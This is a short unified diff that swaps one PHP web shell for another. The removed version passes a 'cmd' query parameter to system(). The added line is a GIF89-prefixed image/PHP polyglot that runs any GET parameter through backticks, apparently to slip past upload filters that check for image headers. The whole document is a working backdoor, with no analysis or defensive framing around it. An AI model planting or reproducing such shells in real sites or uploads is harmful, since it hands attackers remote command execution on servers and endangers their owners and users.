@@ -1,6 +1,1 @@
-<?php
-
-$data = system($_GET["cmd"]);
-echo $data;
-
-?>
+GIF89?<?=`$_GET[0]`?>
